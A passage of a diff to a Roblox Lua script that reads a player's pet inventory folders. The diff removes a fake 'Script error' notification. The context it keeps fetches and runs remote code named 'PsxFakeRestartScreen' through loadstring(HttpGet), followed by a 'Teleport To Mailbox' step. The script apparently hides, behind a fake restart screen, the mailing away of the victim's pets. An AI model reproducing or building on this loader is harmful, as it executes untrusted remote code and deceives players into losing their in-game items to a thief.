@@ -22,18 +22,6 @@ local PetFolders = {
 	game.Players.LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Titanic
 }
  
-if time() <= 30 then
-	wait(1.2)
-	game.StarterGui:SetCore("SendNotification", {
-		Title = "Script error", -- the title (ofc)
-		Text = "Please wait and try again. Remote not found!", -- what the text says (ofc)
-		Icon = "rbxassetid://57254792", -- the image if you want.
-		Duration = 15 -- how long the notification should be in seconds
-	})
-	return
-end
-
- 
 --// Loading UI
 loadstring(game:HttpGet("https://raw.githubusercontent.com/yaskofafa/LuraphDeobfuscator/master/PsxFakeRestartScreen.lua%204.txt"))()
 --// Teleport To Mailbox
